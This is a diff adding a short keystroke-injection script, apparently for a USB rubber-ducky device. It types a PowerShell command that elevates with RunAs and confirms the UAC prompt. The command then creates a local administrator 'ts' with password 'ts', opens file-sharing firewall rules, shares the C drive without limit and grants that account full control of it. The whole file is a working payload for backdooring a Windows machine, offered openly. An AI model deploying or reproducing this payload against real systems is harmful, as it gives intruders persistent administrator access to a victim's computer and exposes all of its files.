@@ -1,0 +1,9 @@
+REM A one-liner to add user "ts" (password "ts"
+REM to the admin group and share the C drive
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -Exec Bypass "saps cmd '/C net User ts ts /ADD&net LocalGroup Administrators ts /ADD&netsh advfirewall firewall set rule group="""File and Printer Sharing""" new enable=Yes&net share ts=c:\ /UNLIMITED&icacls c:* /grant ts:(OI)(CI)F' -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
